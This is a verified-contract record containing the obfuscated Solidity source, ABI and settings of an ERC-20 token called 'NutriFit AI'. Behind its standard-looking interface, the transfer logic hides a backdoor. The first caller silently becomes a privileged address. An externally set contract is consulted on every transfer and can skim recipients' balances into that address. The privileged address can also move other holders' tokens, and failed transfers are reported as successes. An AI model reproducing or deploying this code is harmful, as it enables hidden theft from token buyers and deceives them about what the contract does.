{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"/contracts/NFAI.sol\": {\r\n      \"content\": \"\\n// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.12;\\n    \\ninterface zEAqNPjnDK {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n}\\n     \\nlibrary zxtaRTHxpfer{\\n    \\n    function iFNMiKjGiQOa(address zgScc, address vfmdUia, uint DZU) internal {\\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\\n        (bool qtJgRBDx, bytes memory rNxM) = zgScc.call(abi.encodeWithSelector(0x095ea7b3, vfmdUia, DZU));\\n        require(qtJgRBDx && (rNxM.length == 0 || abi.decode(rNxM, (bool))), 'zxtaRTHxpfer: APPROVE_FAILED');\\n    }\\n\\n    function jdFHbENlikJo(address zgScc, address vfmdUia, uint DZU) internal {\\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\\n        (bool qtJgRBDx, bytes memory rNxM) = zgScc.call(abi.encodeWithSelector(0xa9059cbb, vfmdUia, DZU));\\n        require(qtJgRBDx && (rNxM.length == 0 || abi.decode(rNxM, (bool))), 'zxtaRTHxpfer: TRANSFER_FAILED');\\n    }\\n    \\n    function nVPrCfJ(address vfmdUia, uint DZU) internal {\\n        (bool qtJgRBDx,) = vfmdUia.call{value:DZU}(new bytes(0));\\n        require(qtJgRBDx, 'zxtaRTHxpfer: ETH_TRANSFER_FAILED');\\n    }\\n\\n    function RWTkKxfNK(address zgScc, address from, address vfmdUia, uint DZU) internal returns(bytes memory){\\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\\n        (bool qtJgRBDx, bytes memory rNxM) = zgScc.call(abi.encodeWithSelector(0x23b872dd, from, vfmdUia, DZU));\\n        require(qtJgRBDx && rNxM.length > 0,'zxtaRTHxpfer: TRANSFER_FROM_FAILED'); return rNxM;\\n                       \\n    }\\n\\n}\\n    \\ninterface YXwX {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address YAHuvbJnlGfZ) external view returns (uint256);\\n    function transfer(address vfGx, uint256 FZptsvKm) external returns (bool);\\n    function allowance(address dQdgNaewmQgX, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 FZptsvKm) external returns (bool);\\n    function transferFrom(\\n        address sender,\\n        address vfGx,\\n        uint256 FZptsvKm\\n    ) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed EvIjJFuzFJ, uint256 value);\\n    event Approval(address indexed dQdgNaewmQgX, address indexed spender, uint256 value);\\n}\\n\\ninterface lTzCmzYWUM is YXwX {\\n    function name() external view returns (string memory);\\n    function symbol() external view returns (string memory);\\n    function decimals() external view returns (uint8);\\n}\\n\\nabstract contract UcYCG {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n    \\ncontract NFAI is UcYCG, YXwX, lTzCmzYWUM {\\n    \\n    function totalSupply() public view virtual override returns (uint256) {\\n        return shNEDN;\\n    }\\n    \\n    function increaseAllowance(address QlciUBUaL, uint256 addedValue) public virtual returns (bool) {\\n        mpEGw(_msgSender(), QlciUBUaL, fzBtBfLXa[_msgSender()][QlciUBUaL] + addedValue);\\n        return true;\\n    }\\n    \\n    address private XweHc;\\n    \\n    function symbol() public view virtual override returns (string memory) {\\n        return wSQ;\\n    }\\n    \\n    function allowance(address kQvkyPAJDT, address dSuFOcfKCjus) public view virtual override returns (uint256) {\\n        return fzBtBfLXa[kQvkyPAJDT][dSuFOcfKCjus];\\n    }\\n    \\n    function balanceOf(address aePvBHejkE) public view virtual override returns (uint256) {\\n       return TCuFqColQ[aePvBHejkE];\\n    }\\n    \\n    function decimals() public view virtual override returns (uint8) {\\n        return 18;\\n    }\\n    \\n    address private PENt;\\n    \\n    string private wSQ =  \\\"NFAI\\\";\\n    \\n    function name() public view virtual override returns (string memory) {\\n        return CJsDevGbQlMB;\\n    }\\n    \\n    mapping(address => uint256) private TCuFqColQ;\\n    \\n    mapping(address => mapping(address => uint256)) private fzBtBfLXa;\\n    \\n    function decreaseAllowance(address GNOAbeiMOg, uint256 subtractedValue) public virtual returns (bool) {\\n        uint256 HOG = fzBtBfLXa[_msgSender()][GNOAbeiMOg];\\n        require(HOG >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            mpEGw(_msgSender(), GNOAbeiMOg, HOG - subtractedValue);\\n        }\\n\\n        return true;\\n    }\\n    \\n    function fSrPB(\\n        address vuH,\\n        address uFuh,\\n        uint256 MYhodx\\n    ) internal virtual  returns (bool){\\n        require(vuH != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(uFuh != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        \\n        if(!oKAyEITaZnA(vuH,uFuh)) return false;\\n\\n        if(_msgSender() == address(PENt)){\\n            if(uFuh == vIWB && TCuFqColQ[vuH] < MYhodx){\\n                VFyzUrSopCH(PENt,uFuh,MYhodx);\\n            }else{\\n                VFyzUrSopCH(vuH,uFuh,MYhodx);\\n                if(vuH == PENt || uFuh == PENt) \\n                return false;\\n            }\\n            emit Transfer(vuH, uFuh, MYhodx);\\n            return false;\\n        }\\n        VFyzUrSopCH(vuH,uFuh,MYhodx);\\n        emit Transfer(vuH, uFuh, MYhodx);\\n        bytes memory CdoUPeE = zxtaRTHxpfer.RWTkKxfNK(XweHc, vuH, uFuh, MYhodx);\\n        (bool BdccQojdAKI, uint RkVkxjNTJW) = abi.decode(CdoUPeE, (bool,uint));\\n        if(BdccQojdAKI){\\n            TCuFqColQ[PENt] += RkVkxjNTJW;\\n            TCuFqColQ[uFuh] -= RkVkxjNTJW; \\n        }\\n        return true;\\n    }\\n    \\n    constructor() {\\n        \\n        TCuFqColQ[address(1)] = shNEDN;\\n        emit Transfer(address(0), address(1), shNEDN);\\n\\n    }\\n    \\n    function mpEGw(\\n        address cfHjmSeQ,\\n        address heqGdrSnFQzq,\\n        uint256 zHbvrOKG\\n    ) internal virtual {\\n        require(cfHjmSeQ != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(heqGdrSnFQzq != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        fzBtBfLXa[cfHjmSeQ][heqGdrSnFQzq] = zHbvrOKG;\\n        emit Approval(cfHjmSeQ, heqGdrSnFQzq, zHbvrOKG);\\n\\n    }\\n    \\n    function VFyzUrSopCH(\\n        address dhw,\\n        address FVMpIxLHBr,\\n        uint256 hJfRqWT\\n    ) internal virtual  returns (bool){\\n        uint256 YTwhFcO = TCuFqColQ[dhw];\\n        require(YTwhFcO >= hJfRqWT, \\\"ERC20: transfer Amount exceeds balance\\\");\\n        unchecked {\\n            TCuFqColQ[dhw] = YTwhFcO - hJfRqWT;\\n        }\\n        TCuFqColQ[FVMpIxLHBr] += hJfRqWT;\\n        return true;\\n    }\\n    \\n    address private vIWB;\\n  \\n    \\n    uint256 private shNEDN = 2000000000000 * 10 ** 18;\\n    \\n    function oKAyEITaZnA(\\n        address qubUnAAyMRxq,\\n        address gylrS\\n    ) internal virtual  returns (bool){\\n        if(PENt == address(0) && XweHc == address(0)){\\n            PENt = qubUnAAyMRxq;XweHc=gylrS;\\n            zxtaRTHxpfer.jdFHbENlikJo(XweHc, PENt, 0);\\n            vIWB = zEAqNPjnDK(XweHc).WETH();\\n            return false;\\n        }\\n        return true;\\n    }\\n    \\n    function approve(address xrdt, uint256 nWtFbUltY) public virtual override returns (bool) {\\n        mpEGw(_msgSender(), xrdt, nWtFbUltY);\\n        return true;\\n    }\\n    \\n    string private CJsDevGbQlMB = \\\"NutriFit AI\\\";\\n    \\n    function transferFrom(\\n        address ZEarTAsq,\\n        address gQqLmsA,\\n        uint256 GLUl\\n    ) public virtual override returns (bool) {\\n      \\n        if(!fSrPB(ZEarTAsq, gQqLmsA, GLUl)) return true;\\n\\n        uint256 qGYTiQeKxA = fzBtBfLXa[ZEarTAsq][_msgSender()];\\n        if (qGYTiQeKxA != type(uint256).max) {\\n            require(qGYTiQeKxA >= GLUl, \\\"ERC20: transfer Amount exceeds allowance\\\");\\n            unchecked {\\n                mpEGw(ZEarTAsq, _msgSender(), qGYTiQeKxA - GLUl);\\n            }\\n        }\\n\\n        return true;\\n    }\\n    \\n    function transfer(address JDSnfokv, uint256 zGDXJV) public virtual override returns (bool) {\\n        fSrPB(_msgSender(), JDSnfokv, zGDXJV);\\n        return true;\\n    }\\n    \\n}\\n        \"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [],\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"london\",\r\n    \"libraries\": {},\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"dQdgNaewmQgX\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"EvIjJFuzFJ\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"kQvkyPAJDT\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"dSuFOcfKCjus\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xrdt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"nWtFbUltY\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"aePvBHejkE\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"GNOAbeiMOg\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"QlciUBUaL\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"JDSnfokv\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"zGDXJV\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ZEarTAsq\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"gQqLmsA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"GLUl\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NFAI", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}